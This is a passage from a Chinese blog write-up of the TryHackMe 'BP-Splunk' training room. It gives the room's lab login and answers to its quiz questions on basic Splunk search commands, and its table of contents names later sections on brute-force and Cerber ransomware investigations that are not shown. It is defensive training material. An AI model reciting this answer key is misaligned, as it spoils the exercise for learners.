<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>BP-Splunk-TryHackMe | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="TryHackMe">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bpsplunk  1.Deploy12Username: splunkUserPassword: SplunkUser#321  启动，等待，访问BOX_IP:8000 2. Can you dig it?Splunk的基本搜索命令，主要参考官方文档和Google 2.1 query commandsplunk query一般以什么">
<meta property="og:type" content="article">
<meta property="og:title" content="BP-Splunk-TryHackMe">
<meta property="og:url" content="https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bpsplunk  1.Deploy12Username: splunkUserPassword: SplunkUser#321  启动，等待，访问BOX_IP:8000 2. Can you dig it?Splunk的基本搜索命令，主要参考官方文档和Google 2.1 query commandsplunk query一般以什么">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020072801.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020073001.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020073002.png">
<meta property="article:published_time" content="2020-07-30T06:24:37.000Z">
<meta property="article:modified_time" content="2020-07-30T06:42:09.151Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020072801.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">BP-Splunk-TryHackMe</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">BP-Splunk-TryHackMe</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-07-30T06:24:37.000Z" itemprop="datePublished" class="page-time">
  2020-07-30
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#1-Deploy"><span class="post-toc-number">2.</span> <span class="post-toc-text">1.Deploy</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2-Can-you-dig-it"><span class="post-toc-number">3.</span> <span class="post-toc-text">2. Can you dig it?</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-1-query-command"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">2.1 query command</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-2-显示字段出现次数最少的值"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">2.2 显示字段出现次数最少的值</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-3-显示字段出现次数最多的值"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">2.3 显示字段出现次数最多的值</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-4-导入数据存储位置"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">2.4  导入数据存储位置</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-5-相同的搜索条件"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">2.5 相同的搜索条件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-6-排除重复数据"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">2.6 排除重复数据</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-7-事件持续时间"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">2.7 事件持续时间</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-8-管道"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">2.8 管道</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-9-相关事件图"><span class="post-toc-number">3.9.</span> <span class="post-toc-text">2.9 相关事件图</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-10-一般统计信息"><span class="post-toc-number">3.10.</span> <span class="post-toc-text">2.10 一般统计信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-11-数据结构"><span class="post-toc-number">3.11.</span> <span class="post-toc-text">2.11 数据结构</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-12-数据来源"><span class="post-toc-number">3.12.</span> <span class="post-toc-text">2.12 数据来源</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-13-数据源"><span class="post-toc-number">3.13.</span> <span class="post-toc-text">2.13 数据源</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-14-源点分组"><span class="post-toc-number">3.14.</span> <span class="post-toc-text">2.14 源点分组</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-15-函数搜索"><span class="post-toc-number">3.15.</span> <span class="post-toc-text">2.15 函数搜索</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-16-正则表达式"><span class="post-toc-number">3.16.</span> <span class="post-toc-text">2.16 正则表达式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-17-子集和特定视图"><span class="post-toc-number">3.17.</span> <span class="post-toc-text">2.17 子集和特定视图</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-18-时间日期字段"><span class="post-toc-number">3.18.</span> <span class="post-toc-text">2.18 时间日期字段</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-19-前几个值"><span class="post-toc-number">3.19.</span> <span class="post-toc-text">2.19 前几个值</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-20-反转顺序"><span class="post-toc-number">3.20.</span> <span class="post-toc-text">2.20 反转顺序</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-21-重命名字段"><span class="post-toc-number">3.21.</span> <span class="post-toc-text">2.21 重命名字段</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-22-特定时间范围"><span class="post-toc-number">3.22.</span> <span class="post-toc-text">2.22 特定时间范围</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-23-图表使用特定时间长度"><span class="post-toc-number">3.23.</span> <span class="post-toc-text">2.23 图表使用特定时间长度</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-24-事件统计数量"><span class="post-toc-number">3.24.</span> <span class="post-toc-text">2.24 事件统计数量</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-25-splunk-apps"><span class="post-toc-number">3.25.</span> <span class="post-toc-text">2.25 splunk apps</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-26-添加新功能"><span class="post-toc-number">3.26.</span> <span class="post-toc-text">2.26 添加新功能</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-27-SOC含义"><span class="post-toc-number">3.27.</span> <span class="post-toc-text">2.27 SOC含义</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-28-SIEM含义"><span class="post-toc-number">3.28.</span> <span class="post-toc-text">2.28 SIEM含义</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-29-BOTS含义"><span class="post-toc-number">3.29.</span> <span class="post-toc-text">2.29 BOTS含义</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-30-CIM含义"><span class="post-toc-number">3.30.</span> <span class="post-toc-text">2.30 CIM含义</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-31-Splunk论坛"><span class="post-toc-number">3.31.</span> <span class="post-toc-text">2.31 Splunk论坛</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#3-BOTS"><span class="post-toc-number">4.</span> <span class="post-toc-text">3. BOTS</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#4-Halp-I’m-drowning-in-logs"><span class="post-toc-number">5.</span> <span class="post-toc-text">4. Halp, I’m drowning in logs!</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#5-Advanced-Persistent-Threat"><span class="post-toc-number">6.</span> <span class="post-toc-text">5. Advanced Persistent Threat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-1-What-IP-is-scanning-our-web-server"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">5.1 What IP is scanning our web server?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-2-What-web-scanner-scanned-the-server"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">5.2 What web scanner scanned the server?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-3-What-is-the-IP-address-of-our-web-server"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">5.3 What is the IP address of our web server?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-4-What-content-management-system-is-imreallynotbatman-com-using"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">5.4 What content management system is imreallynotbatman.com using?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-5-What-address-is-performing-the-brute-forcing-attack-against-our-website"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">5.5 What address is performing the brute-forcing attack against our website?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-6-What-was-the-first-password-attempted-in-the-attack"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">5.6 What was the first password attempted in the attack?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-7-One-of-the-passwords-in-the-brute-force-attack-is-James-Brodsky’s-favorite-Coldplay-song-Which-six-character-song-is-it"><span class="post-toc-number">6.7.</span> <span class="post-toc-text">5.7 One of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Which six character song is it?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-8-What-was-the-correct-password-for-admin-access-to-the-content-management-system-running-imreallynotbatman-com"><span class="post-toc-number">6.8.</span> <span class="post-toc-text">5.8 What was the correct password for admin access to the content management system running imreallynotbatman.com?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-9-What-was-the-average-password-length-used-in-the-password-brute-forcing-attempt-rounded-to-closest-whole-integer"><span class="post-toc-number">6.9.</span> <span class="post-toc-text">5.9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-10-How-many-seconds-elapsed-between-the-time-the-brute-force-password-scan-identified-the-correct-password-and-the-compromised-login-rounded-to-2-decimal-places"><span class="post-toc-number">6.10.</span> <span class="post-toc-text">5.10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-11-How-many-unique-passwords-were-attempted-in-the-brute-force-attempt"><span class="post-toc-number">6.11.</span> <span class="post-toc-text">5.11 How many unique passwords were attempted in the brute force attempt?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-12-What-is-the-name-of-the-executable-uploaded-by-P01s0n1vy"><span class="post-toc-number">6.12.</span> <span class="post-toc-text">5.12 What is the name of the executable uploaded by P01s0n1vy?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-13-What-is-the-MD5-hash-of-the-executable-uploaded"><span class="post-toc-number">6.13.</span> <span class="post-toc-text">5.13 What is the MD5 hash of the executable uploaded?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-14-What-is-the-name-of-the-file-that-defaced-the-imreallynotbatman-com-website"><span class="post-toc-number">6.14.</span> <span class="post-toc-text">5.14 What is the name of the file that defaced the imreallynotbatman.com website?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-15-This-attack-used-dynamic-DNS-to-resolve-to-the-malicious-IP-What-fully-qualified-domain-name-FQDN-is-associated-with-this-attack"><span class="post-toc-number">6.15.</span> <span class="post-toc-text">5.15  This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-16-What-IP-address-has-P01s0n1vy-tied-to-domains-that-are-pre-staged-to-attack-Wayne-Enterprises"><span class="post-toc-number">6.16.</span> <span class="post-toc-text">5.16  What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-17-Based-on-the-data-gathered-from-this-attack-and-common-open-source-intelligence-sources-for-domain-names-what-is-the-email-address-that-is-most-likely-associated-with-P01s0n1vy-APT-group"><span class="post-toc-number">6.17.</span> <span class="post-toc-text">5.17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-18-GCPD-reported-that-common-TTPs-Tactics-Techniques-Procedures-for-the-P01s0n1vy-APT-group-if-initial-compromise-fails-is-to-send-a-spear-phishing-email-with-custom-malware-attached-to-their-intended-target-This-malware-is-usually-connected-to-P01s0n1vy’s-initial-attack-infrastructure-Using-research-techniques-provide-the-SHA256-hash-of-this-malware"><span class="post-toc-number">6.18.</span> <span class="post-toc-text">5.18  GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-19-What-special-hex-code-is-associated-with-the-customized-malware-discussed-in-the-previous-question"><span class="post-toc-number">6.19.</span> <span class="post-toc-text">5.19 What special hex code is associated with the customized malware discussed in the previous question?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-20-What-does-this-hex-code-decode-to"><span class="post-toc-number">6.20.</span> <span class="post-toc-text">5.20 What does this hex code decode to?</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#6-Ransomware"><span class="post-toc-number">7.</span> <span class="post-toc-text">6. Ransomware</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-1-What-was-the-most-likely-IP-address-of-we8105desk-on-24AUG2016"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">6.1 What was the most likely IP address of we8105desk on 24AUG2016?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-2-What-is-the-name-of-the-USB-key-inserted-by-Bob-Smith"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">6.2 What is the name of the USB key inserted by Bob Smith?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-3-After-the-USB-insertion-a-file-execution-occurs-that-is-the-initial-Cerber-infection-This-file-execution-creates-two-additional-processes-What-is-the-name-of-the-file"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">6.3 After the USB insertion, a file execution occurs that is the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-4-During-the-initial-Cerber-infection-a-VB-script-is-run-The-entire-script-from-this-execution-pre-pended-by-the-name-of-the-launching-exe-can-be-found-in-a-field-in-Splunk-What-is-the-length-in-characters-of-this-field"><span class="post-toc-number">7.4.</span> <span class="post-toc-text">6.4 During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-5-Bob-Smith’s-workstation-we8105desk-was-connected-to-a-file-server-during-the-ransomware-outbreak-What-is-the-IP-address-of-the-file-server"><span class="post-toc-number">7.5.</span> <span class="post-toc-text">6.5 Bob Smith’s workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-6-What-was-the-first-suspicious-domain-visited-by-we8105desk-on-24AUG2016"><span class="post-toc-number">7.6.</span> <span class="post-toc-text">6.6 What was the first suspicious domain visited by we8105desk on 24AUG2016?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-7-The-malware-downloads-a-file-that-contains-the-Cerber-ransomware-cryptor-code-What-is-the-name-of-that-file"><span class="post-toc-number">7.7.</span> <span class="post-toc-text">6.7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-8-What-is-the-parent-process-ID-of-121214-tmp"><span class="post-toc-number">7.8.</span> <span class="post-toc-text">6.8 What is the parent process ID of 121214.tmp?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-9-Amongst-the-Suricata-signatures-that-detected-the-Cerber-malware-which-signature-ID-alerted-the-fewest-number-of-times"><span class="post-toc-number">7.9.</span> <span class="post-toc-text">6.9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-10-The-Cerber-ransomware-encrypts-files-located-in-Bob-Smith’s-Windows-profile-How-many-txt-files-does-it-encrypt"><span class="post-toc-number">7.10.</span> <span class="post-toc-text">6.10 The Cerber ransomware encrypts files located in Bob Smith’s Windows profile. How many .txt files does it encrypt?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-11-How-many-distinct-PDFs-did-the-ransomware-encrypt-on-the-remote-file-server"><span class="post-toc-number">7.11.</span> <span class="post-toc-text">6.11 How many distinct PDFs did the ransomware encrypt on the remote file server?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-12-What-fully-qualified-domain-name-FQDN-does-the-Cerber-ransomware-attempt-to-direct-the-user-to-at-the-end-of-its-encryption-phase"><span class="post-toc-number">7.12.</span> <span class="post-toc-text">6.12  What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">7.13.</span> <span class="post-toc-text">总结</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-BP-Splunk-TryHackMe"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">BP-Splunk-TryHackMe</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-07-30 14:24:37" datetime="2020-07-30T06:24:37.000Z"  itemprop="datePublished">2020-07-30</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://tryhackme.com/room/bpsplunk" target="_blank" rel="noopener">https://tryhackme.com/room/bpsplunk</a></li>
</ul>
<h1 id="1-Deploy"><a href="#1-Deploy" class="headerlink" title="1.Deploy"></a>1.Deploy</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: splunkUser</span><br><span class="line">Password: SplunkUser#321</span><br></pre></td></tr></table></figure>

<p>启动，等待，访问BOX_IP:8000</p>
<h1 id="2-Can-you-dig-it"><a href="#2-Can-you-dig-it" class="headerlink" title="2. Can you dig it?"></a>2. Can you dig it?</h1><p>Splunk的基本搜索命令，主要参考官方文档和Google</p>
<h2 id="2-1-query-command"><a href="#2-1-query-command" class="headerlink" title="2.1 query command"></a>2.1 query command</h2><p>splunk query一般以什么命令开头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search</span><br></pre></td></tr></table></figure>

<h2 id="2-2-显示字段出现次数最少的值"><a href="#2-2-显示字段出现次数最少的值" class="headerlink" title="2.2 显示字段出现次数最少的值"></a>2.2 显示字段出现次数最少的值</h2><p>在搜索值时，在安全性范围内查找不常见的事件是相当典型的。 我们可以在搜索中包括哪些命令来查找这些命令？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rare, 显示字段出现次数最少的值</span><br></pre></td></tr></table></figure>

<h2 id="2-3-显示字段出现次数最多的值"><a href="#2-3-显示字段出现次数最多的值" class="headerlink" title="2.3 显示字段出现次数最多的值"></a>2.3 显示字段出现次数最多的值</h2><p>反过来，如果我们想要最常见的安全事件怎么办？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top, 显示字段出现次数最多的值</span><br></pre></td></tr></table></figure>

<h2 id="2-4-导入数据存储位置"><a href="#2-4-导入数据存储位置" class="headerlink" title="2.4  导入数据存储位置"></a>2.4  导入数据存储位置</h2><p>当我们将数据导入splunk时，其存储在什么位置？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index</span><br></pre></td></tr></table></figure>

<h2 id="2-5-相同的搜索条件"><a href="#2-5-相同的搜索条件" class="headerlink" title="2.5 相同的搜索条件"></a>2.5 相同的搜索条件</h2><p>我们可以创建“views”，使我们能够一遍又一遍地反复进行相同的搜索； 这些叫什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dashboard</span><br></pre></td></tr></table></figure>

<h2 id="2-6-排除重复数据"><a href="#2-6-排除重复数据" class="headerlink" title="2.6 排除重复数据"></a>2.6 排除重复数据</h2><p>导入数据并不总是按计划进行，有时我们可能会获得同一数据的多个副本，我们在搜索中排除这些副本的命令是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dedup</span><br></pre></td></tr></table></figure>

<h2 id="2-7-事件持续时间"><a href="#2-7-事件持续时间" class="headerlink" title="2.7 事件持续时间"></a>2.7 事件持续时间</h2><p>Splunk不仅可以用于SIEM，而且还可以广泛用于市场营销以跟踪诸如网站购物之旅从开始到结束的持续时间之类的事情。 我们可以在搜索中使用什么命令来跟踪这些事件对花费多长时间？</p>
<h2 id="2-8-管道"><a href="#2-8-管道" class="headerlink" title="2.8 管道"></a>2.8 管道</h2><p>类似于Linux的方式，我们可以将搜索结果“输送”到其他命令中，为此使用什么字符？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|</span><br></pre></td></tr></table></figure>

<h2 id="2-9-相关事件图"><a href="#2-9-相关事件图" class="headerlink" title="2.9 相关事件图"></a>2.9 相关事件图</h2><p>在使用Splunk执行数据分析时，跟踪随时间推移发生的事件很有用，我们包括哪些命令来绘制此图？</p>
<h2 id="2-10-一般统计信息"><a href="#2-10-一般统计信息" class="headerlink" title="2.10 一般统计信息"></a>2.10 一般统计信息</h2><p>如果我们想收集有关搜索的一般统计信息怎么办？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stats</span><br></pre></td></tr></table></figure>

<h2 id="2-11-数据结构"><a href="#2-11-数据结构" class="headerlink" title="2.11 数据结构"></a>2.11 数据结构</h2><p>导入到Splunk中的数据分为几列，这些被称为什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fields</span><br></pre></td></tr></table></figure>

<h2 id="2-12-数据来源"><a href="#2-12-数据来源" class="headerlink" title="2.12 数据来源"></a>2.12 数据来源</h2><p>当我们将数据导入Splunk时，我们可以看到它的来源，这叫什么？ 这里是分析主机数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host</span><br></pre></td></tr></table></figure>

<h2 id="2-13-数据源"><a href="#2-13-数据源" class="headerlink" title="2.13 数据源"></a>2.13 数据源</h2><p>当我们将数据导入Splunk时，我们可以从系统内部查看其起源点，这叫什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source</span><br></pre></td></tr></table></figure>

<h2 id="2-14-源点分组"><a href="#2-14-源点分组" class="headerlink" title="2.14 源点分组"></a>2.14 源点分组</h2><p>我们可以对这些起源点进行分类，并将它们分组在一起，将它们视为特定类型。 这个叫什么？ 使用在搜索查询中找到的语法，而不是为此使用适当的名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sourcetype</span><br></pre></td></tr></table></figure>

<h2 id="2-15-函数搜索"><a href="#2-15-函数搜索" class="headerlink" title="2.15 函数搜索"></a>2.15 函数搜索</h2><p>在对数据执行函数搜索时，我们在评估本身之前使用特定命令，该命令是什么？</p>
<h2 id="2-16-正则表达式"><a href="#2-16-正则表达式" class="headerlink" title="2.16 正则表达式"></a>2.16 正则表达式</h2><p>喜欢它还是讨厌它，正则表达式是Splunk的重要组成部分，我们在搜索中对特定的正则表达式使用什么命令？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rex</span><br></pre></td></tr></table></figure>

<h2 id="2-17-子集和特定视图"><a href="#2-17-子集和特定视图" class="headerlink" title="2.17 子集和特定视图"></a>2.17 子集和特定视图</h2><p>为不那么熟练的Splunk用户创建子集和特定视图是很普遍的，这些被称为什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pivot table</span><br></pre></td></tr></table></figure>

